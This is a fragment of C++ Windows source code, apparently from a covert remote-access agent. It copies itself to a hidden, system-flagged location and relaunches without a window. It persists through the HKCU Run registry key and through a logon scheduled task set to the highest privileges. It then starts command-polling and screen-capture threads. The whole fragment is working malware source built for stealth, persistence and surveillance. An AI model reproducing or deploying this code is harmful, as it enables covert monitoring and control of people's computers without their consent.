        SetFileAttributesA(old.c_str(), FILE_ATTRIBUTE_NORMAL); DeleteFileA(old.c_str());
        if (GetFileAttributesA(dst.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(cur, dst.c_str())) {
            CopyFileA(cur, dst.c_str(), FALSE);
            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
        if (_stricmp(cur, dst.c_str())) {
            STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
            string cmd = "\"" + dst + "\"";
            if (CreateProcessA(dst.c_str(), &cmd[0], 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
            ExitProcess(0);
        }
    }

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        char ep[MAX_PATH]; GetModuleFileNameA(0, ep, MAX_PATH); DWORD el = strlen(ep)+1;
        RegSetValueExA(hk, AGENT_NAME, 0, REG_SZ, (BYTE*)ep, el); RegCloseKey(hk);
    }
    char ep3[MAX_PATH]; if (GetModuleFileNameA(0, ep3, MAX_PATH) > 0) {
        char s[2048]; snprintf(s, 2048, "cmd.exe /c schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f 2>nul", AGENT_NAME, ep3); run_hidden(s);
    }

    g_ip = get_ip();

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)poll_thread, 0, 0, 0);
    if (!no_screen) CreateThread(0, 0, (LPTHREAD_START_ROUTINE)screen_thread, 0, 0, 0);

    while (true) Sleep(10000);
    return 0;
}
